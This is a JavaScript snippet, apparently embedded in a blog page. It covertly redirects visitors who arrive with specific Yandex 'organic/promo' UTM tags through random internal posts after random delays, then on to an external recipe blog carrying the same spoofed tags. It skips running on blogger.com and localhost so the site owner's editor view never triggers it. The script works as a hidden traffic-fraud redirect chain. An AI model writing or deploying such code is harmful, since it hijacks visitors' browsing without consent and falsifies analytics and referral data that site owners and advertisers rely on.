//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
    "https://www.setevyetehnologii.ru/2023/08/navigating-digital-landscape-strategies.html",
	"https://www.setevyetehnologii.ru/2023/08/the-power-of-personal-branding-building.html",
	"https://www.setevyetehnologii.ru/2023/08/unlocking-success-mastering-time.html",
	"https://www.setevyetehnologii.ru/2023/08/innovative-marketing-trends-leveraging.html",
	"https://www.setevyetehnologii.ru/2023/08/from-startup-to-scale-up-essential.html",
	"https://www.setevyetehnologii.ru/2023/08/customer-centric-excellence-crafting.html",
	"https://www.setevyetehnologii.ru/2023/08/sustainable-business-practices.html",
	"https://www.setevyetehnologii.ru/2023/08/the-art-of-negotiation-winning-deals.html",
	"https://www.setevyetehnologii.ru/2023/08/resilience-in-times-of-change.html",
    "https://www.setevyetehnologii.ru/2026/03/2026.html"
    ];

    const externalLinks = [
    "https://www.domashniyrestoran.ru/2023/05/thai-coconut-curry-soup-with-shrimp-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/baked-parmesan-crusted-chicken-with.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/roasted-beet-and-goat-cheese-salad-with.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/lemon-herb-grilled-salmon-with-quinoa.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/creamy-garlic-butter-tuscan-shrimp-pasta.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/bbq-jackfruit-sandwiches-with-tangy.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/mediterranean-stuffed-bell-peppers-with.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/caramelized-onion-and-gruyere-cheese.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.domashniyrestoran.ru/2023/05/blueberry-lemon-ricotta-pancakes-with.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.domashniyrestoran.ru/2023/05/mexican-street-corn-salad-with-lime.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

